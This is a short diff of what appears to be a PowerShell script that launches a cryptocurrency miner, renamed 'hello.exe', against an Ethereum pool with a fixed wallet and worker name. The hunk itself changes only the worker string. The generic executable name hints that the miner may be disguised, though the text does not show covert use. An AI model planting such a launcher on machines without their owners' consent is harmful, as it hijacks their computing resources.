@@ -32,7 +32,7 @@ setx GPU_USE_SYNC_OBJECTS 1
 setx GPU_MAX_ALLOC_PERCENT 100
 setx GPU_SINGLE_ALLOC_PERCENT 100
 
-Start-Process -FilePath "hello.exe" -ArgumentList "--farm-recheck","200","-U","-S","eth-eu1.nanopool.org:9999","-O","0xB5a9b7402AF83507B77BB56ae12947823502742C.TOMB_RAIDER.miner@slurpgeit.nl"
+Start-Process -FilePath "hello.exe" -ArgumentList "--farm-recheck","200","-U","-S","eth-eu1.nanopool.org:9999","-O","0xB5a9b7402AF83507B77BB56ae12947823502742C.TOMB_RAIDER/miner@slurpgeit.nl"
 
 Add-Type -AssemblyName System.Windows.Forms
 
